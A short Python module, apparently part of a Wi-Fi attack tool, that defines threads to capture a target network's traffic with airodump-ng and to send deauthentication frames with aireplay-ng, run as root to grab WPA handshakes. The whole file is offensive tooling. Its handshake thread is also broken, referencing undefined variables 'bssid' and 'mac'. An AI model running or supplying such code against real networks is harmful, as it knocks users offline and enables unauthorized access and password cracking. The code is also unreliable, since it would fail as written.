from threading import Thread
from ShellHelper import commandAsRootWithTimeout

class DumpDevicesThread(Thread):
    def __init__(self, network, monitoring, timeout):
        Thread.__init__(self)
        self.timeout = timeout
        self.command = "timeout %i airodump-ng -c %s --bssid %s -w ./output/ %s" % (timeout, network['channel'],network['bssid'],monitoring)

    def run(self):
        commandAsRootWithTimeout(self.command, self.timeout)

class GetHandshakeThread(Thread):
    def __init__(self,network, monitoring, timeout):
        Thread.__init__(self)
        self.timeout = timeout
        self.command = "timeout %i aireplay-ng -0 2 -a %s -c %s %s" % (timeout,bssid,mac ,monitoring)

    def run(self):
        commandAsRootWithTimeout(self.command, self.timeout)
    
